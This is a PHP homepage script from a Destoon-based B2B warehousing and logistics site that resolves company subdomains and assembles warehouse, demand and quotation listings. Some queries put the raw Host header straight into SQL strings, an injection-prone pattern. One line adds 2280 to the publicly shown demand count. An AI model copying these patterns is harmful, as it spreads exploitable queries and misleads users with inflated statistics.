<?php
/*
	[Destoon B2B System] Copyright (c) 2008-2013 Destoon.COM
	This is NOT a freeware, use is subject to license.txt
*/
$aa=array(
	array('a'=>'VHeLf'),
	array('b'=>'wS8WP'),
	array('c'=>'6HmW'),
);
$bb=array();
foreach($aa as $k=>$row){
	$bb[key($row)]=$row[key($row)]; ;
}

require 'common.inc.php';
$username = $domain = '';
if(isset($homepage) && check_name($homepage)) {
	$username = $homepage;
} else if(!$cityid) {
	$host = get_env('host');
	if(substr($host, 0, 4) == 'www.') {
		$whost = $host;
		$host = substr($host, 4);
	} else {
		$whost = $host;
	}
	if(strpos(DT_PATH, $host) === false) {
		$www = str_replace($CFG['com_domain'], '', $host);
		if(check_name($www)) {
			$username = $homepage = $www;
		} else {
			if($whost == $host) {//301 xxx.com to www.xxx.com
				$w3 = 'www.'.$host;
				$c = $db->get_one("SELECT userid FROM {$DT_PRE}company WHERE domain='$w3'");
				if($c) d301('http://'.$w3);
			}
			$c = $db->get_one("SELECT username,domain FROM {$DT_PRE}company WHERE domain='$whost'".($host == $whost ? '' : " OR domain='$host'"), 'CACHE');
			if($c) {
				$username = $homepage = $c['username'];
				$domain = $c['domain'];
			}
		}
	}
}

if($username) {
	$moduleid = 4;
	$module = 'company';
	$MOD = cache_read('module-'.$moduleid.'.php');
	
	include load('company.lang');
	require DT_ROOT.'/module/'.$module.'/common.inc.php';
	include DT_ROOT.'/module/'.$module.'/init.inc.php';
} else {
	if($DT['safe_domain']) {
		$safe_domain = explode('|', $DT['safe_domain']);
		$pass_domain = false;
		foreach($safe_domain as $v) {
			if(strpos($DT_URL, $v) !== false) { $pass_domain = true; break; }
		}
		$pass_domain or dhttp(404);
	}
	
	if($DT['index_html']) {
		$html_file = $CFG['com_dir'] ? DT_ROOT.'/'.$DT['index'].'.'.$DT['file_ext'] : DT_CACHE.'/index.inc.html';
		if(!is_file($html_file)) tohtml('index');
		if(is_file($html_file)) exit(include($html_file));
	}
	//$AREA or $AREA = cache_read('area.php'); modify by visky 20160811优化

	//wap 改为 mobile   update by sally on 20160620
	if($EXT['mobile_enable']) $head_mobile = $EXT['mobile_url'];
	$seo_title = $DT['seo_title'];
	$head_keywords = $DT['seo_keywords'];
	$head_description = $DT['seo_description'];

	$MD5 = cache_read('module-5.php');
	
	//仓储服务
	$TYPE1=cache_read('aoma-option-1-typeid.php');//仓库类型
	$CLASSIFY=cache_read('aoma-option-1-classify.php');//仓库库型
	$MEASUREAREA=cache_read('aoma-option-1-measurearea.php');//仓库面积

	//仓储面积需求  add by sally on 20160607
	$measurearea_buy = cache_read('aoma-option-1-sqarea.php');

	//运输服务
	$TYPE2=cache_read('aoma-option-2-typeid.php');//线路类型

	$query = $db->query("SELECT areaid, areaname{$LFS} AS areaname FROM {$DT_PRE}area WHERE parentid=0 ORDER BY listorder, areaid ");
	$COUNTRIES = array();
	while($r=$db->fetch_array($query)){
		$COUNTRIES[$r['areaid']] = $r['areaname'];
	}

   //add by visky 20160605统计信息，调用缓存
	$nmbox1_sell_ware= cache_read('data-cache-index-sell-1-conunt.php');//仓储服务数据统计缓存
	$nmbox1_buy_ware=cache_read('data-cache-index-buy-1-conunt.php');//仓储需求数据统计缓存
	$nmbox1_buy_ware['buy_total'] += 2280;


	//add by visky 20160605 第三方物流服务商入驻联盟统计，调用上面仓储服务数据统计缓存
	//数字显示5位 update by sally on 20160616
	if($nmbox1_sell_ware['sell_total']){
		$var=sprintf("%05d",$nmbox1_sell_ware['sell_total']);
		$total_arr = str_split($var);
        	foreach ($total_arr as $k => $v) {
        		if($k==2)$total_html[] = '<i class="comma"><img src="'.DT_SKIN.'images/douhao.png" /></i>';
				$total_html[] = '<i class="kuang">'.$v.'</i>';
				
			}	
			$total_html=implode('',$total_html);
	}

	/* 新增 start by Sally 20160308 */
	
	//仓库服务连接
	$sell_w_url = DT_PATH."sell/warehouse/?";
	$sell_t_url = DT_PATH."sell/transport/?";

	//热门城市
	$hot_area = $HOTAREA;
	$hot_area_top_4 = array_slice($hot_area,0,4);
	$CLASSIFY_TOP_4 = array_slice($CLASSIFY['value_list'],0,4);
	$MEASUREAREA_TOP_2 = array_slice($MEASUREAREA['value_list'],0,2);

	//本期精仓
	$CLASSIFY_TOP_5 = array_slice($CLASSIFY['value_list'],0,5);
	$fds5 = $MD5['fields'];
	$fds5 = 'i.' . str_replace(',', ',i.', $fds5);
	$fds5_1 = $MD5['fields1'];
	$fds5_1 = $fds5 . ',e.' . str_replace(',', ',e.', $fds5_1);

	$MD6 = cache_read('module-6.php');
	$fds6 = $MD6['fields'];
	$fds6 = 'i.' . str_replace(',', ',i.', $fds6);
	$fds6_1 = $MD6['fields1'];
	$fds6_1 = $fds6 . ',e.' . str_replace(',', ',e.', $fds6_1);
	$fds6_1 .= ',i.credit_quotation,i.stoptime,i.level,i.price_limit,i.star,i.demand_points';



	$condition5_1 = $condition6_1 = "1";

	//$condition5_1 .= " AND i.status=3";
	$condition5_1 .= " AND (i.status=3  AND (i.status2=0 OR i.status2=3)) ";
	$condition6_1 .= " AND e.opentype=1"; //公有类型才能被搜索
	//$condition6_1 .= " AND i.status=3";
    $condition6_1 .= $cityid ? " AND i.status in (3,4,5)" : " AND (i.status=3  AND (i.status2=0 OR i.status2=3)) ";

    if ($cityid && $city_template) {//城市分站首页数据处理

    	$ARE = $AREA[$cityid];
    	$condition = "i.categoryid=1";
    	$condition .= $ARE['child'] ? " AND i.areaid IN (".$ARE['arrchildid'].")" : " AND i.areaid=$cityid";

    	//获取当前城市的仓库服务数据统计
    	$city_selldata=$db->get_one("select count(*) as total, sum(e.areasize1) as sum_areasize1 from ".get_table(5)." i left join ".other_table('extend',5,1)." e on(e.itemid=i.itemid) where {$condition} and i.status=3");

    	//当前城市需求数据统计
    	$city_buydata=$db->get_one("select count(*) as total_demand from ".get_table(6)." i left join ".other_table('extend',6,1)." e on e.itemid=i.itemid where {$condition} and e.opentype=1 and i.status in(3,4,5) ");

    	//获取城市地图数据
    	$user_maps = array(); 
    	$table=get_table(5).' i left join '.other_table('extend',5,1).' e on (e.itemid=i.itemid)';
    	$result = $db->query("SELECT e.mapxy,i.itemid, i.vip, i.linkurl FROM {$table} WHERE {$condition} and i.status=3", $DT['cache_search'] ? 'CACHE' : '', $DT['cache_search']);
		while($r=$db->fetch_array($result)){
			$r['linkurl'] = $MODULE[5]['linkurl1'].$r['linkurl'];
			$user_maps[]=$r;
		}
		$db->free_result($result);

		//需求报价信息数据
		class_exists('quotation') or include DT_ROOT.'/include/quotation.class.php';
		$quotation = new quotation(1);
		$offset = 0;
		$pagesize = 10;
		$quotation_list = $quotation->get_list();
		foreach ($quotation_list as &$val) {
			$val['sell_no'] = general_ware_no($val['sellid']);
			preg_match('/W\d{12}/', $val['theme'], $match);
			$val['buy_no'] = $match[0];
			$addtime = date('m月d日H时', $val['addtime']);
			if($val['type']==1){
				$type_txt = '正常';
			}elseif($val['type']==2){
				$type_txt = '限时';
			}else{
				$type_txt = '免费';
			}
			$val['title'] = "仓库【{$val['sell_no']}】于{$addtime}使用{$val['credit']}点积分，{$type_txt}报价了需求【{$val['buy_no']}】";
		}
		unset($val);

		$WTLIB = cache_read('aoma-option-1-wtlib.php'); //库型
		$FLOTRE = cache_read('aoma-option-1-flotre.php');//地坪
		$PRECAT = cache_read('aoma-option-1-precat.php');//专业类别
		$STOCAT = cache_read('aoma-option-1-stocat.php');//库存类别
		$OTHER_OPT = cache_read('aoma-option-1-other_opt.php');//其他资料


    } else {//平台首页数据处理

		//获取缓存仓储服务数据
		$sell_nice_list = $sell_new_list = array();
		$data_sell_1 = cache_read('data-cache-index-sell-1.php');
		if(!empty($data_sell_1)){
			foreach ($data_sell_1 as $key => $value) {
				if($key=='new'){
					$sell_new_list = $value;
				}else{
					$temp_rand = rand(0,count($value['value_list'])-1);
					$sell_nice_list[$key] = $value['value_list'][$temp_rand];
				}
			}
		}
		
		//格式化数据
		foreach ($sell_nice_list as &$sell_nice) $sell_nice && formate_data($sell_nice,5,1);
		foreach ($sell_new_list as &$sell_new) $sell_new && formate_data($sell_new,5,1);


		//获取缓存仓储需求数据
		$buy_nice_list = $buy_new_list = array();
		$data_buy_1 = cache_read('data-cache-index-buy-1.php');
		if(!empty($data_buy_1)){
			$buy_new_list = $data_buy_1['new_buy'];
			$buy_nice_list = $data_buy_1['best_buy'];
		}
		//格式化数据
		foreach ($buy_new_list as  &$buy_new) {
			foreach ($buy_new['value_list'] as &$buy_new_v) $buy_new_v && formate_data($buy_new_v,6,1);
		}
		foreach ($buy_nice_list as $key=>$buy_nice) {
			$temp_rand = rand(0,count($buy_nice['value_list'])-1);	
			$buy_nice = $buy_nice['value_list'][$temp_rand];
			$buy_nice && formate_data($buy_nice,6,1);
			$buy_nice_list[$key] = $buy_nice;
		}
	}


	/* 新增 end by Sally */

	//地址插件相关
	$areaList=cache_read('areaData1'.$LFS.'.php');
	$areaList or $areaList=array();
	$areaData=json_encode($areaList);

	if($city_template) {
		include template($city_template, 'city');
	} else {
		include template('index');
	}
}
?>